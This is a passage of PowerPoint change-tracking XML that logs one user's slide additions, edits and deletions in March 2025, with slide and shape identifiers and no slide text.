        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="238628542" sldId="362"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:01:55.650" v="41"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="804485718" sldId="363"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:01:55.958" v="42"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1699207309" sldId="364"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:01:56.018" v="43"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3735486349" sldId="365"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:01:56.162" v="44"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="126032379" sldId="366"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:44:09.008" v="46"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1562164104" sldId="367"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-17T15:47:03.293" v="300" actId="255"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2293073542" sldId="368"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:49:24.383" v="142"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2293073542" sldId="368"/>
            <ac:spMk id="4" creationId="{16CCE087-BD65-F1DC-1A8E-33514C114C63}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-17T15:47:03.293" v="300" actId="255"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2293073542" sldId="368"/>
            <ac:spMk id="5" creationId="{14CA2913-24E1-ECB3-42C8-79FAEA4592CD}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="472892435" sldId="369"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:56:54.111" v="298" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2693323874" sldId="369"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod ord">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:11:49.641" v="314" actId="22"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2108371064" sldId="370"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:57:01.022" v="299"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2108371064" sldId="370"/>
            <ac:spMk id="4" creationId="{0BC16B19-3BC6-6C39-4CDC-66FD4C872857}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:55:59.726" v="295" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2108371064" sldId="370"/>
            <ac:spMk id="5" creationId="{B6CD54B9-5826-FE5F-604F-1665FDF9E105}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:11:49.641" v="314" actId="22"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2108371064" sldId="370"/>
            <ac:picMk id="3" creationId="{3E8DBA8D-9C67-BA3B-F8E1-D80625A3CF43}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:53:04.016" v="222" actId="5793"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3532523845" sldId="371"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:49:29.502" v="143"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3532523845" sldId="371"/>
            <ac:spMk id="4" creationId="{912BB12D-CC6F-BC7E-3FAC-6821EF19C8B4}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-16T07:53:04.016" v="222" actId="5793"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3532523845" sldId="371"/>
            <ac:spMk id="5" creationId="{C0299157-B772-B0B0-C695-B73EA1913065}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3025944200" sldId="372"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="680786746" sldId="373"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="80628007" sldId="374"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="463362644" sldId="375"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="654608868" sldId="376"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3650105825" sldId="376"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2628521278" sldId="377"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="714565181" sldId="378"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3537713616" sldId="379"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="32852236" sldId="380"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2427872828" sldId="381"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2578737727" sldId="382"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2989617769" sldId="383"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="471122951" sldId="384"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3987938855" sldId="385"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4134878511" sldId="385"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="105133072" sldId="386"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="23358819" sldId="387"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="47094207" sldId="388"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4114603741" sldId="388"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2115002553" sldId="389"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2122555257" sldId="389"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="427466444" sldId="390"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2562941117" sldId="391"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2560783180" sldId="392"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3204829884" sldId="392"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="388397622" sldId="393"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2725147503" sldId="393"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3867351119" sldId="394"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="91382918" sldId="395"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="86065769" sldId="396"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1647286038" sldId="397"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1976452655" sldId="398"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4165849769" sldId="398"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3316306428" sldId="399"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3289750946" sldId="400"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3406329423" sldId="401"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="779717233" sldId="402"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="907440495" sldId="403"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4158265485" sldId="404"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2166687213" sldId="405"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="826451299" sldId="406"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4002299708" sldId="408"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1601157176" sldId="409"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2596680420" sldId="411"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1521460865" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3160002234" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2820580642" sldId="423"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1380305164" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="162578701" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2819027860" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1709445879" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3278387277" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
